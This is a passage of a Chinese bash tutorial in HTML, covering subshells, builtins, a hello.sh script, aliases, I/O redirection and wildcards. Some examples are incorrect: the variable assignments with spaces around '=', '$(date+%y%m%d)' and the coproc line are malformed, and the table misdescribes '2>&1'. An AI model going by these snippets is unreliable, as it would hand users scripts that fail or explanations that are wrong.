在上面例子中，bash 命令被输入了三次。实际上创建了三个子 shell。ps &amp;#x2013;forest 命令展示了这些子 shell 间的嵌套结构。可以使用 exit 命令退出子 shell
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ exit

&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;进程列表&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ pwd;ls;cd /etc;pwd
/home/zrg/zhaorengui.github.io
404.html  archives  categories  _config.yml  _drafts  Gemfile.lock  index.html  _orgs   README.en.md  _sass       _site  tags
about     assets    category    _data        Gemfile  _includes     _layouts    _posts  README.md     search.xml  tag
/etc

&lt;/pre&gt;
&lt;p&gt;
在命令之间加入“;，指定要依次执行的一系列命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ (pwd;ls;cd /etc;pwd)
/home/zrg/zhaorengui.github.io
404.html  archives  categories  _config.yml  _drafts  Gemfile.lock  index.html  _orgs   README.en.md  _sass       _site  tags
about     assets    category    _data        Gemfile  _includes     _layouts    _posts  README.md     search.xml  tag
/etc

&lt;/pre&gt;
&lt;p&gt;
使用括号包含命令，成为进程列表
&lt;br /&gt;
查看是否生成了子 shell，使用：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ echo $BASH_SUBSHELL

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;子shell用法&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 在后台睡眠10s
$ sleep 10&amp;amp;
// 查看后台进程
$ ps -f
or
$ jobs -l

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//将进程列表置入后台
$ (sleep 2;echo $BASH_SUBSHELL;sleep 2)&amp;amp;
// 创建备份
$ (tar -cf Rich.rar /home/rich;tar -cf My.tar /home/christine)&amp;amp;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//协程：在后台生成一个子shell，同时在这个子shell中执行命令。
// 进行协程处理，使用 coproc 命令
$ coproc sleep 10
$ coproc My_Job{sleep 10;}

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5bb6fa7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5bb6fa7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.1.4&lt;/span&gt; 理解 shell 的内建命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-1-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
外部命令 ::
也被称为文件系统命令，是存在于bash shell之外的程序。ps 就是一个外部命令，可以使用 which 和 type 命令找到
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ which ps
$ type -a ps

&lt;/pre&gt;
&lt;p&gt;
当外部命令执行时，会创建一个子进程，这种操作叫做衍生（forking）。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
内建命令 ::
内建命令和外部命令的区别在于前者不需要使用子进程来执行。它们已经和 shell 编译成一体，作为 shell 工具的组成部分存在。可以利用 type 命令来了解某个命令是否是内建的。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ type cd
cd is a shell builtin

&lt;/pre&gt;
&lt;p&gt;
要注意，有些命令有多种实现。既有内建命令也有外部命令。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ type -a echo
echo is a shell builtin
echo is /bin/echo
$ type -a pwd
pwd is a shell builtin
pwd is /bin/pwd 

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbd3feef&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgbd3feef&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.2&lt;/span&gt; Shell Basic&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cac6c7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org2cac6c7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.1&lt;/span&gt; 第一个 shell 程序：Hello World!&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
首先，新建并编辑一个名为 hello.sh 的文件
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim hello.sh

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org43c9331&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/bash  #&amp;#21578;&amp;#35785;shell&amp;#29992;/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&amp;#26469;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;This script displays the date and who's #&amp;#33050;&amp;#26412;&amp;#29992;&amp;#36884;&amp;#35828;&amp;#26126;&amp;#21450;&amp;#20316;&amp;#32773;&amp;#31561;&amp;#20449;&amp;#24687;&amp;#25551;&amp;#36848; &lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;This's is a shell script.&quot;&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#26174;&amp;#31034;&amp;#28040;&amp;#24687;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; -n &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The time and date are: &quot;&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;n&amp;#34920;&amp;#31034;&amp;#22312;&amp;#19968;&amp;#34892;&amp;#26174;&amp;#31034;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Hello,World!&quot;&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;print &quot;Hello,World!&quot;&lt;/span&gt;
date &lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;print date.&lt;/span&gt;

&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;User info for userid: $USER&quot;&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#65292;&amp;#29992;set&amp;#21629;&amp;#20196;&amp;#21487;&amp;#20197;&amp;#26597;&amp;#30475;&amp;#19968;&amp;#20221;&amp;#23436;&amp;#25972;&amp;#30340;&amp;#24403;&amp;#21069;&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#21015;&amp;#34920;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; UID: $&lt;span style=&quot;color: #FF8C00;&quot;&gt;UID&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; HOME: $&lt;span style=&quot;color: #FF8C00;&quot;&gt;HOME&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The cost of the item is \$15.&quot;&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#32654;&amp;#20803;&amp;#38656;&amp;#35201;&amp;#20351;&amp;#29992;\&amp;#36716;&amp;#20041;&lt;/span&gt;

&lt;span style=&quot;color: #FF8C00;&quot;&gt;days&lt;/span&gt; = 10 &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#29992;&amp;#25143;&amp;#33258;&amp;#23450;&amp;#20041;&amp;#21464;&amp;#37327;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;days&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#26377;&amp;#20004;&amp;#31181;&amp;#26041;&amp;#27861;&amp;#21487;&amp;#20197;&amp;#23558;&amp;#21629;&amp;#20196;&amp;#36171;&amp;#32473;&amp;#21464;&amp;#37327;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;test&lt;/span&gt; = &lt;span style=&quot;color: #AF87FF; font-weight: bold;&quot;&gt;`date`&lt;/span&gt; &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#29992;&amp;#19968;&amp;#23545;&amp;#21453;&amp;#24341;&amp;#21495;&amp;#25226;&amp;#25972;&amp;#20010;&amp;#21629;&amp;#20196;&amp;#22260;&amp;#36215;&amp;#26469;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;test&lt;/span&gt; = $(date) &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#20351;&amp;#29992;$()&amp;#26684;&amp;#24335;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;today&lt;/span&gt; = $(date+%y%m%d) &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;today&amp;#21464;&amp;#37327;&amp;#34987;&amp;#36171;&amp;#20104;&amp;#26684;&amp;#24335;&amp;#21270;&amp;#21518;&amp;#30340;date&amp;#21629;&amp;#20196;&amp;#30340;&amp;#36755;&amp;#20986;&amp;#12290;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
此时，我们想看看运行效果，需要给 hello.sh 可执行(x)权限
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo chmod +x hello.sh

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
执行，查看效果
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ./hello.sh

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org07867ff&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org07867ff&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.2&lt;/span&gt; 历史命令与补全(tab键)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;历史命令的调用
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看历史命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ history

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;使用上、下箭头调用之前的命令&lt;/li&gt;
&lt;li&gt;使用“!n”重复执行第 n条历史命令&lt;/li&gt;
&lt;li&gt;使用“!!”重复执行上一条命令&lt;/li&gt;
&lt;li&gt;使用“!&amp;lt;string&amp;gt;”重复执行最后一条以某个字符串开头的命令&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用 &amp;lt;tab&amp;gt; 键可以对命令、文件、目录等进行自动补全。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org772959a&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org772959a&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.3&lt;/span&gt; 设置命令别名：alias&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
//利用别名代替长命令
$ vim ~/.bashrc                                                                                                                                    : //存在这样的三行代码，意思就是检查是否存在 .bash_aliases 文件，存在就加载                 

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org4a425ca&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ -f ~/.bash_aliases ]; &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
. ~/.bash_aliases
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
//于是,新建并编辑
$ vim .bash_aliases

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;shadowsocks&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;alias&lt;/span&gt; &lt;span style=&quot;color: #FF8C00;&quot;&gt;shadowsocks&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;sudo sslocal -c /etc/shadowsocks.json -d start&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4551326&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org4551326&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.4&lt;/span&gt; 重定向输入和输出&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-4&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 12:&lt;/span&gt; 重定向字符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;0&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;标准输入&lt;/th&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;1&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;标准输出&lt;/th&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;2&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;标准错误输出&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;默认为标准输出重定向，与 &amp;gt;1 相同&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;2&amp;gt;&amp;amp;1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;把标准输出重定向到标准输出&lt;/td&gt;
&lt;/tr&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;/tr&gt;
&lt;/tbody&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;amp;&amp;gt;file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;把标准输出和标准错误输出都重定向到 file 中&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;/dev/null&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;是一个特殊文件，所有重定向到它的东西都丢弃掉&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
输出重定向
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 标准输出重定向
$ date &amp;gt; test
$ date &amp;gt;&amp;gt; test

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 标准错误输出重定向
$ date 2&amp;gt;test
$ date 2&amp;gt;&amp;gt;test

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 正确输出和错误输出同时保存
$ date &amp;gt; test 2&amp;gt;&amp;amp;1
$ date &amp;gt;&amp;gt; test 2&amp;gt;&amp;amp;1
$ date &amp;amp;&amp;gt;test
$ date &amp;amp;&amp;gt;&amp;gt;test
$ date &amp;gt;&amp;gt;test1 2&amp;gt;&amp;gt;test2

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
输入重定向
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 输入重定向
$ wc &amp;lt; test
//wc 命令，默认情况下，会输出3个值：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;文本的行数&lt;/li&gt;
&lt;li&gt;文本的词数&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文本的字节数
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
// 内联输入重定向(inline input redirection)
$ wc &amp;lt;&amp;lt; EOF

&lt;/pre&gt;
&lt;p&gt;
shell 会用PS2环境变量中定义的次提示符来提示输入数据
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb4124a9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgb4124a9&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.5&lt;/span&gt; 多命令顺序执行与管道符&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
// 同时执行
$ ls -lht;less test.txt
$ cd ~/test &amp;amp;&amp;amp; touch hello.sh

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 管道运算符
$ rpm -qa | sort

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgaa70c84&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgaa70c84&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.6&lt;/span&gt; 通配符&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-6&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
shell通配符(wildcard)
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 13:&lt;/span&gt; shell 常见通配符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;字符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;含义&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;实例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;lowast;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配 0 或多个字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a*b  a与b之间可以有任意长度的任意字符, 也可以一个也没有, 如aabcb, axyzb, a012b, ab。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;?&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配任意一个字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a?b  a与b之间必须也只能有一个字符, 可以是任意字符, 如aab, abb, acb, a0b。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[list]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配 list 中的任意单一字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a[xyz]b   a与b之间必须也只能有一个字符, 但只能是 x 或 y 或 z, 如: axb, ayb, azb。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[!list]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配 除list 中的任意单一字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a[!0-9]b  a与b之间必须也只能有一个字符, 但不能是阿拉伯数字, 如axb, aab, a-b。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[c1-c2]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配 c1-c2 中的任意单一字符 如：[0-9] [a-z]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a[0-9]b  0与9之间必须也只能有一个字符 如a0b, a1b&amp;#x2026; a9b。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;{string1,string2,&amp;#x2026;}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配 sring1 或 string2 (或更多)其一字符串&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a{abc,xyz,123}b    a与b之间只能是abc或xyz或123这三个字符串之一。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
shell 特殊字符
shell 除了有通配符之外，由shell 负责预先先解析后，将处理结果传给命令行之外，shell还有一系列自己的其他特殊字符。
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 14:&lt;/span&gt; shell 特殊字符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;字符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;IFS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;由 &amp;lt;space&amp;gt; 或 &amp;lt;tab&amp;gt; 或 &amp;lt;enter&amp;gt; 三者之一组成(我们常用 space )。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;CR&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;由 &amp;lt;enter&amp;gt; 产生。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设定变量。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;作变量或运算替换(请不要与 shell prompt 搞混了)。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;重导向 stdout。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;lt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;重导向 stdin。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令管线。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;amp;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;重导向 file descriptor ，或将命令置于背境执行。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;( )&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;将其内的命令置于 nested subshell 执行，或用于运算或命令替换。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;{ }&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;在前一个命令结束时，而忽略其返回值，继续执行下一个命令。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;amp;&amp;amp;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;在前一个命令结束时，若返回值为 true，继续执行下一个命令。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;两个竖线&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;在前一个命令结束时，若返回值为 false，继续执行下一个命令。 *&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;iexcl;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;执行 history 列表中的命令。*&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
shell 转义符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 15:&lt;/span&gt; shell 转义符号&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;字符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;‘’(单引号)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;又叫硬转义，其内部所有的shell 元字符、通配符都会被关掉。注意，硬转义中不允许出现’(单引号)。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;“”(双引号)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;又叫软转义，其内部只允许出现特定的shell 元字符：$用于参数代换 `用于命令代替&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\(反斜杠)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;又叫转义，去除其后紧跟的元字符或通配符的特殊意义。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
shell 解析脚本过程
&lt;/p&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/shell-analysis-process.png&quot; alt=&quot;shell-analysis-process.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc0eb25c&quot; class=&quot;outline-4&quot;&gt;
